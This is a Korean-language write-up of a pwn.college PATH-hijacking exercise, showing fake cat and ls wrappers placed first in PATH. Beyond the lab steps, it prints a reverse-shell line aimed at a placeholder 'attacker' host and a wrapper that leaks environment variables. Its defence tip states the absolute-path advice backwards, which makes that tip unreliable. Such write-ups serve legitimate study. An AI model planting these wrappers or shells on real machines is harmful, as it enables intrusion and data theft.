# Hijacking Commands

**Module:** Linux Luminarium → Pondering PATH  
**Challenge:** #4  
**Tags:** `PATH-hijacking`, `privilege-escalation`, `command-injection`

---

## 문제 설명

$PATH를 조작하여 챌린지 바이너리가 실행하는 명령어를 가로채는(hijack) 방법을 익힌다.

---

## 시나리오

챌린지 바이너리 내부에서 `cat`을 절대 경로 없이 호출하는 경우:
```c
system("cat /flag");  // 절대 경로 없이 cat 호출
```

---

## 풀이

### 단계 1: 가짜 명령어 만들기
```bash
# /tmp/cat 파일 생성 (가짜 cat)
cat > /tmp/cat << 'EOF'
#!/bin/bash
/bin/cat /flag
EOF
chmod +x /tmp/cat
```

### 단계 2: PATH 하이재킹
```bash
# /tmp를 PATH 맨 앞에 추가
export PATH=/tmp:$PATH

# 확인
which cat
# /tmp/cat  ← 우리가 만든 가짜 cat
```

### 단계 3: 챌린지 실행
```bash
/challenge/run
# 챌린지가 cat을 호출 → /tmp/cat 실행 → /flag 출력
# pwn.college{...}
```

---

## PATH 하이재킹 원리

```bash
# 일반적인 PATH
echo $PATH
# /usr/local/bin:/usr/bin:/bin

# cat 찾는 순서
# 1. /usr/local/bin/cat → 없음
# 2. /usr/bin/cat → 없음
# 3. /bin/cat → 있음! → 실행

# PATH 하이재킹 후
export PATH=/tmp:$PATH
# 1. /tmp/cat → 있음! → 우리 파일 실행 ← 하이재킹!
```

---

## 다양한 하이재킹 패턴

### 가짜 명령어로 정보 수집
```bash
cat > /tmp/ls << 'EOF'
#!/bin/bash
/bin/ls "$@"          # 원본 기능 유지
cat /flag             # 추가 동작
EOF
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

### 역방향 쉘 삽입
```bash
cat > /tmp/cat << 'EOF'
#!/bin/bash
/bin/cat "$@"
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
EOF
```

### 환경 변수 유출
```bash
cat > /tmp/cmd << 'EOF'
#!/bin/bash
env > /tmp/leaked_env
/bin/cmd "$@"
EOF
```

---

## 방어 관점

- 스크립트에서 **절대 경로** 사용: `/bin/cat` 대신 `cat`
- root 스크립트에서 PATH 신뢰하지 않기
- `secure_path` (sudo) 설정으로 PATH 고정

---

## 관련 개념

- [[15-Silly-Shebanigans/Overview]] - shebang 활용
- [[02-Pondering-Paths/04-Implicit-Relative-Path]] - 현재 디렉토리
